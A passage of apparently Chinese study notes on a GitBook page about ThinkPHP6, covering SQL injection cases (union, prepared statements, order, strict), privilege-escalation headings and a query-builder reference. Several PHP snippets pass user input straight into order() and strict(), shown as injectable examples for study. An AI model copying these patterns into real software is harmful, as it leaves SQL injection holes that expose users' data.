        <span class="hljs-keyword">return</span> Db::getLastsql();

    }
</code></pre>
<p><a href="https://imgse.com/i/ppCT9OK" target="_blank"><img src="https://s1.ax1x.com/2023/02/28/ppCT9OK.png" alt="ppCT9OK.png"></a></p>
<h5 id="union">union</h5>
<pre><code class="lang-php">~~~

















<span class="hljs-comment">#### &#x4E0D;&#x5B58;&#x5728;&#x6CE8;&#x5165;</span>

<span class="hljs-comment">##### &#x9884;&#x5904;&#x7406;</span>

~~~php
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sqli</span><span class="hljs-params">($id)</span>
    </span>{
        $user = Db::table(<span class="hljs-string">&apos;ty_user&apos;</span>)-&gt;whereRaw(<span class="hljs-string">&quot;id=:id&quot;</span>, [<span class="hljs-string">&apos;id&apos;</span> =&gt; $id])-&gt;find();
        <span class="hljs-keyword">return</span> Db::getLastsql();

    }
</code></pre>
<p><a href="https://imgse.com/i/ppChzb4" target="_blank"><img src="https://s1.ax1x.com/2023/02/28/ppChzb4.png" alt="ppChzb4.png"></a><a href="https://imgse.com/i/ppChxrF" target="_blank"><img src="https://s1.ax1x.com/2023/02/28/ppChxrF.png" alt="ppChxrF.png"></a></p>
<h5 id="order">order</h5>
<pre><code>SELECT * FROM `ty_user` WHERE ( id=1 ) ORDER BY `id` DESC LIMIT 1
</code></pre><p>&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x4EE5;&#x5F80;&#x7684;&#x6392;&#x5E8F;&#x6CE8;&#x5165;&#x662F;&#x53EF;&#x4EE5;&#x63A7;&#x5236;id&#x548C;DESC&#x7684;</p>
<pre><code class="lang-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sqli</span><span class="hljs-params">($id, $order)</span>
    </span>{
        $user = Db::table(<span class="hljs-string">&apos;ty_user&apos;</span>)-&gt;where(<span class="hljs-string">&apos;id=1&apos;</span>)-&gt;order($id, $order)-&gt;find();
        <span class="hljs-keyword">return</span> Db::getLastsql();

    }
</code></pre>
<p><a href="https://imgse.com/i/ppC4win" target="_blank"><img src="https://s1.ax1x.com/2023/02/28/ppC4win.png" alt="ppC4win.png"></a></p>
<h5 id="strict">strict</h5>
<pre><code class="lang-php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sqli</span><span class="hljs-params">($str)</span>
    </span>{
        $user = Db::table(<span class="hljs-string">&apos;ty_user&apos;</span>)-&gt;fieldRaw(<span class="hljs-string">&apos;id,username,password&apos;</span>)-&gt;strict($str)-&gt;select();
        <span class="hljs-keyword">return</span> Db::getLastsql();

    }
</code></pre>
<h5 id="limit">limit</h5>
<h5 id="page">page</h5>
<p>=====================</p>
<h4 id="&#x8D8A;&#x6743;">&#x8D8A;&#x6743;</h4>
<p>&#x67E5;&#x770B;&#x578B;&#x8D8A;&#x6743;</p>
<p>&#x7BE1;&#x6539;&#x578B;&#x8D8A;&#x6743;</p>
<h4 id="&#x6784;&#x9020;&#x5668;">&#x6784;&#x9020;&#x5668;</h4>
<h5 id="&#x67E5;&#x8BE2;">&#x67E5;&#x8BE2;</h5>
<pre><code>&#x5355;&#x6761;&#x6570;&#x636E;
find(),findOrEmpty(),findOrFail()
&#x6570;&#x636E;&#x96C6;
select()&#xFF0C;select()-&gt;toArray()&#xFF0C;selectOrFail()
&#x503C;&#x548C;&#x5217;&#x67E5;&#x8BE2;
where(&apos;id&apos;, 1)-&gt;value(&apos;name&apos;)&#xFF0C;column(&apos;name&apos;, &apos;id&apos;)&#xFF0C;
</code></pre><h5 id="&#x589E;&#x52A0;">&#x589E;&#x52A0;</h5>
<pre><code>&#x6DFB;&#x52A0;&#x4E00;&#x6761;
save($data)&#xFF0C;insert($data)&#xFF0C;insertGetId($data)
&#x6DFB;&#x52A0;&#x591A;&#x6761;
insertAll($data)&#xFF0C;insertAll($data)
</code></pre><h5 id="&#x66F4;&#x65B0;">&#x66F4;&#x65B0;</h5>
<pre><code>Db::name(&apos;user&apos;)
    -&gt;save([&apos;id&apos; =&gt; 1, &apos;name&apos; =&gt; &apos;thinkphp&apos;]);

Db::name(&apos;user&apos;)
    -&gt;where(&apos;id&apos;, 1)
    -&gt;update([&apos;name&apos; =&gt; &apos;thinkphp&apos;]);

Db::name(&apos;user&apos;)
    -&gt;where(&apos;id&apos;, 1)
    -&gt;data([&apos;name&apos; =&gt; &apos;thinkphp&apos;])
    -&gt;update();
</code></pre>
                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="../interview/golang.html" class="navigation navigation-prev " aria-label="Previous page: golang后端开发面试题">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="thinkphp面试题.html" class="navigation navigation-next " aria-label="Next page: thinkphp框架面试题">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"thinkphp","level":"2.5","depth":1,"next":{"title":"thinkphp框架面试题","level":"2.5.1","depth":2,"path":"thinkphp/thinkphp面试题.md","ref":"thinkphp/thinkphp面试题.md","articles":[]},"previous":{"title":"golang后端开发面试题","level":"2.4.1","depth":2,"path":"interview/golang.md","ref":"interview/golang.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["-lunr"],"pluginsConfig":{"highlight":{},"search":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"thinkphp/thinkphp6.md","mtime":"2023-05-28T11:49:07.820Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-09-19T07:29:17.418Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

